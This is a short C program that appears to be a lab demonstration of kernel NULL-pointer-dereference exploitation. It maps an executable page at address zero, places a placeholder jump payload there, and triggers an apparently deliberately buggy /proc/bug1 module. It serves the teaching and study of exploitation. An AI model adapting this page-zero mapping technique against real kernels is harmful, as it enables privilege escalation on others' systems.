#include <sys/mman.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

char payload[] = "\xe9\xea\xbe\xad\x0b";

int main()
{
	mmap(0, 4096, // one page
		PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, // MAP_FIXED!
		-1, 0);

	memcpy(0, payload, sizeof(payload));

	int fd = open("/proc/bug1", O_WRONLY);
	write(fd, "foo", 3);
}
